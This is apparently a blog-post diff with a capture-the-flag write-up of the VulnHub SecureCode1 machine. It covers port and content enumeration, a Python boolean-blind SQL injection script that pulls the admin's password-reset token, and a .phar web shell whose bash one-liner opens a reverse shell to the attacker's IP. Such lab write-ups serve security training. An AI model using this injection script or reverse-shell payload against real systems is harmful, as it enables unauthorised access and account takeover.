@@ -1,0 +1,154 @@
+---
+layout: post
+title:  VulnHub SecureCode1 Write-Up
+description: OSWE-like vulnerable machine write-up.
+image: /assets/400x400.jpg
+author: thr3athunt3r
+date:   2021-05-29 02:00:00 +0800
+categories: ctf
+---
+
+### 1. Service Discovery: 
+#### Basic port knocking on all ports
+```bash
+nmap -p- -v 192.168.139.143
+```
+
+![](/assets/securecode1/securecode1_nmap_1.png)
+
+#### Port service enumeration
+```bash
+nmap -sC -sV -O -Pn -o nmap.txt 192.168.139.143
+```
+
+![](/assets/securecode1/securecode1_nmap_2.png)
+
+### 2. Content Discovery: 
+#### Default root directory content on http service
+- We can determine the server has php running on backend by appending `index.php` on root directory.
+
+![](/assets/securecode1/securecode1_home.png)
+
+#### Brute force contents on target server
+```bash
+ffuf -u http://192.168.139.143/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+ -e .php,.html,.rar,.7zip,.tar.gz,.gz,.zip,.bak -o ffuf.txt -fs 3650
+```
+
+![](/assets/securecode1/securecode1_ffuf.png)
+
+#### Valid users can be enumerated through `resetPassword.php`
+- `admin` user enumerated, password has been reset
+
+![](/assets/securecode1/securecode1_reset2.png)
+
+![](/assets/securecode1/securecode1_reset.png)
+
+![](/assets/securecode1/securecode1_reset_pw.png)
+
+#### Basic authentication tests attempted with username `admin` but nothing works
+![](/assets/securecode1/securecode1_test.png)
+
+#### Download `source_code.zip` that we found earlier
+![](/assets/securecode1/securecode1_download.png)
+
+### 3. Source Code Analysis: 
+#### Unzipped content structure of `source_code.zip`
+![](/assets/securecode1/securecode1_unzipped.png)
+
+#### `/db.sql`
+- One of the tables in database named `user`
+- `user` table has these columns: `id`, `username`, `password`, `email`, `gender`, `id_level`, `token`
+
+![](/assets/securecode1/securecode1_db.png)
+
+#### `/login/resetPassword.php`
+- A token with 15 alphanumeric characters was generated and sent to admin's mailbox
+- We can reset admin's password via `http://192.168.139.143/login/doResetPassword.php?token=<TOKEN>`
+
+![](/assets/securecode1/securecode1_reset_php.png)
+
+#### `/item/viewItem.php`
+- Most of the contents in the server require authenticated access, except this
+- `id` paramerter vulnerable to SQL injection
+- `mysqli_real_escape_string` method only sanitize some special characters
+- User input was not fully sanitized, we can still perform SQL injection without any special characters
+
+![](/assets/securecode1/securecode1_view.png)
+
+#### `/item/updateItem.php`
+- PHP file upload is possible with .phar extension
+
+![](/assets/securecode1/securecode1_update.png)
+
+### 4. Testing SQL Injection: 
+#### Boolean-based blind SQL 
+- if *TRUE*
+
+![](/assets/securecode1/securecode1_burp_1.png)
+
+- if *FALSE*
+
+![](/assets/securecode1/securecode1_burp_2.png)
+
+#### Extract admin's password reset `token` from `user` table
+- `exploit.py`
+
+```python
+#!/usr/bin/python3
+import requests
+
+token = ''
+position = 1
+
+while(1):
+    for i in range(0,255):
+        url = 'http://192.168.139.144/item/viewItem.php?id=1+AND+(SELECT+IF(1,(ASCII(SUBSTRING((SELECT+token+FROM+user+where+id=1),'
+        + str(position) + ',1))=' + str(i) + '),0))'
+        r = requests.get(url)
+        if r.status_code == 404:            
+            token = token+str(chr(i))
+            position = position + 1
+            print(token)
+    if len(token) == 15:        
+        break
+```
+![](/assets/securecode1/securecode1_exploit.png)
+
+#### Reset admin's password with that token
+
+![](/assets/securecode1/securecode1_change_pw.png)
+
+#### Logged in with new password and we got our first flag
+
+![](/assets/securecode1/securecode1_login.png)
+
+### 5. Insecure File Upload to RCE: 
+#### Create a simple php reverse web shell
+- `backdoor.phar`
+
+```php
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.139.132/3344 0>&1'"); ?>
+```
+
+#### Upload the web shell by editing any of the existing items
+![](/assets/securecode1/securecode1_shell.png)
+
+#### Listen port on our attacker machine
+![](/assets/securecode1/securecode1_listen.png)
+
+#### Refresh the web page and we've got our shell
+![](/assets/securecode1/securecode1_refresh.png)
+
+![](/assets/securecode1/securecode1_enter.png)
+
+#### Also the second flag
+![](/assets/securecode1/securecode1_flag2.png)
+
+### 6. Finished
+
+*Only 2 flags in this machine.*
+<br>
+<br>
+<br>
+
